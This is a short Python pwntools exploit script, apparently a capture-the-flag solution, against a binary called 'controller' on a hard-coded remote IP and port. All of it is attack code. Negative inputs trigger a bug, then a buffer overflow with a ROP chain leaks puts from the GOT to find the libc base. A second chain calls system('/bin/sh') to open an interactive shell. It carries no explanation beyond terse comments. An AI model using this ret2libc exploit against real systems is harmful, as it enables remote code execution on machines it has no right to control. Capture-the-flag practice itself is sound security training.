from pwn import *

elf = ELF('./controller')
libc = ELF('./libc.so.6')

# setup

def setup():
    r.recvuntil('recources: ')
    r.sendline('-65338')
    r.sendline('-130676')
    r.recvuntil('> ')
    r.sendline('2')
    r.recvuntil('> ')

#r = process('./controller')
r = remote('139.59.185.150',32300)
setup()

# gadgets

pop_rdi = 0x4011d3
pop_rsi_r15 = 0x4011d1

# payload

payload = 'A'*40
payload += p64(pop_rdi)
payload += p64(elf.got['puts'])
payload += p64(elf.plt['puts'])
payload += p64(0x4006b0) # _start

r.sendline(payload)
r.recvuntil('\n')
leak = r.recv(6) + '\x00\x00'
puts = u64(leak)
log.info('Leaked puts @ %s' % hex(puts))
log.info('Libc puts @ %s' % hex(libc.symbols['puts']))
libc_base = puts - libc.symbols['puts']
log.info('Libc base @ %s' % hex(libc_base))
system = libc_base + libc.symbols['system']
bin_sh = libc_base + 0x1b3e1a
log.info('System @ %s' % hex(system))
log.info('/bin/sh @ %s' % hex(bin_sh))

payload = 'B'*40
payload += p64(pop_rsi_r15)
payload += p64(0)
payload += p64(0)
payload += p64(pop_rdi)
payload += p64(bin_sh)
payload += p64(system)

setup()
r.sendline(payload)
r.interactive()
